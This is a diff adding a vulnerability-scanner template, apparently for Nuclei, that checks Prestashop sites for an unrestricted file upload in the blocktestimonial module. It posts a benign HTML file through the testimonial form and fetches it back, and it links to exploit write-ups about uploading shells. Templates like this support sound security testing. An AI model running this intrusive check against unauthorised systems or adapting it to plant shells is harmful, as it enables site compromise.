@@ -1,0 +1,74 @@
+id: prestashop-blocktestimonial-file-upload
+info:
+  name: Prestashop Blocktestimonial Modules - File Upload Vulnerability
+  author: MaStErChO
+  severity: critical
+  reference:
+    - https://3xploit7.blogspot.com/2016/12/pretashop-blocktestimonial-upload-shell.html
+    - https://github.com/indoxploit-coders/blocktestimonial-file-upload
+    - https://exploit.linuxsec.org/prestashop-module-blocktestimonial-file-upload-auto-exploit
+  classification:
+    cwe-id:
+      - CWE-434
+  metadata:
+    runzero-review: REJECT/2025-11-07/excluding tag intrusive
+    framework: prestashop
+    max-request: 2
+    product: ap_pagebuilder
+    shodan-query: http.component:"prestashop"
+    vendor: apollotheme
+  tags: blocktestimonial,file-upload,intrusive,prestashop,vuln
+variables:
+  data: '{{rand_base(6, "abc")}}'
+  filename: '{{rand_base(7, "abc")}}'
+http:
+  - host-redirects: true
+    matchers:
+      - part: body_1
+        type: word
+        words:
+          - Your testimonial was submitted successfully.
+      - part: body_2
+        type: word
+        words:
+          - '{{data}}'
+          # digest: 490a0046304402201723102f369056843fe0785ff7f967fdda759a217f3e8b0efac48ddd814446b702205024b865c3feaca9980b9116bc04a03175fb977f1e623599172ef07d3f64f8d3:922c64590222798bb761d5b6d8e72950
+        # digest: 490a0046304402201723102f369056843fe0785ff7f967fdda759a217f3e8b0efac48ddd814446b702205024b865c3feaca9980b9116bc04a03175fb977f1e623599172ef07d3f64f8d3:922c64590222798bb761d5b6d8e72950
+    matchers-condition: and
+    max-redirects: 3
+    raw:
+      - |
+        POST /modules/blocktestimonial/addtestimonial.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_submitter_name"
+
+        {{data}}
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_title"
+
+        {{data}}
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_main_message"
+
+        {{data}}
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_img"; filename="{{filename}}.html"
+        Content-Type: text/html
+
+        <html>
+        <body>
+        <h1>{{data}}</h1>
+        </body>
+        </html>
+
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial"
+
+        Submit Testimonial
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl--
+      - |
+        GET /upload/{{filename}}.html HTTP/1.1
+        Host: {{Hostname}}
